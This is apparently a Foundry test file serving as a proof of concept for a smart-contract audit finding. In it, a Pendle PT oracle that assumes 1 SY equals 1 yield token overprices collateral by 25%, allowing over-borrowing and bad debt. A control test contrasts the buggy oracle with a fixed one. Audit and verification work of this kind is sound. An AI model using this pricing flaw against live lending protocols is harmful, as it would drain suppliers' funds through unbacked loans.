// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    MiniToken,
    Oracles,
    PendlePTOracle,
    PendlePTOracleFixed
} from "./62489-h-8-incorrect-assumption-that-one-1-pendle-standard-yield-sy.sol";

// Notional Exponent H-8: PendlePTOracle with useSyOracleRate=true prices PT as
// (SY-per-PT) x (USD-per-YieldToken), assuming 1 SY == 1 Yield Token. When 1 SY
// redeems for < 1 Yield Token, the PT price is inflated → collateral overvalued
// → over-borrow → bad debt.
contract PoC_62489_PendleSyOracleInflation is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant PT_TO_SY = 1.25e18; // getPtToSyRate (SY per PT); 1 SY = 0.8 asset
    uint256 internal constant PT_TO_ASSET = 1e18; // getPtToAssetRate (asset per PT, true)
    int256 internal constant BASE_TO_USD = 1e8; // asset = $1
    uint256 internal constant PT_COLLATERAL = 1000 ether;

    function test_exploit_inflatedOracle_enablesBadDebt() public {
        Exploit e = new Exploit();
        e.run();

        MiniToken badDebt = e.badDebt();

        // The inflated oracle let the borrower draw 1250 against PT worth only 1000.
        assertEq(e.buggyLimit(), 1250 ether, "buggy borrow limit should be 25% inflated");
        assertEq(e.trueValue(), 1000 ether, "true PT value");
        emit log_named_decimal_uint("borrowable (inflated oracle)", e.buggyLimit(), 18);
        emit log_named_decimal_uint("true collateral value      ", e.trueValue(), 18);
        emit log_named_decimal_uint("bad debt to suppliers      ", badDebt.balanceOf(SINK), 18);

        // The 250 shortfall is unbacked bad debt the suppliers absorb.
        assertEq(badDebt.balanceOf(SINK), 250 ether, "bad debt = borrow - true value");
    }

    // Direct oracle comparison: the buggy (SY-rate) oracle over-prices PT by exactly the
    // SY->asset discount; the fixed (asset-rate) oracle returns the true price.
    function test_control_fixedOracle_returnsTruePrice() public {
        Oracles oracles = new Oracles(PT_TO_SY, PT_TO_ASSET, BASE_TO_USD);
        PendlePTOracle buggy = new PendlePTOracle(oracles, oracles, address(0xBEEF), 900, true);
        PendlePTOracleFixed fixedOracle = new PendlePTOracleFixed(oracles, oracles, address(0xBEEF), 900);

        int256 buggyAnswer = buggy.latestAnswer();
        int256 fixedAnswer = fixedOracle.latestAnswer();
        emit log_named_int("buggy PT price (SY rate)   ", buggyAnswer);
        emit log_named_int("fixed PT price (asset rate)", fixedAnswer);

        assertEq(buggyAnswer, 1.25e18, "buggy oracle inflates PT price 25%");
        assertEq(fixedAnswer, 1e18, "fixed oracle returns true PT price");
        assertGt(buggyAnswer, fixedAnswer, "SY-rate oracle over-values PT vs asset-rate oracle");
    }
}
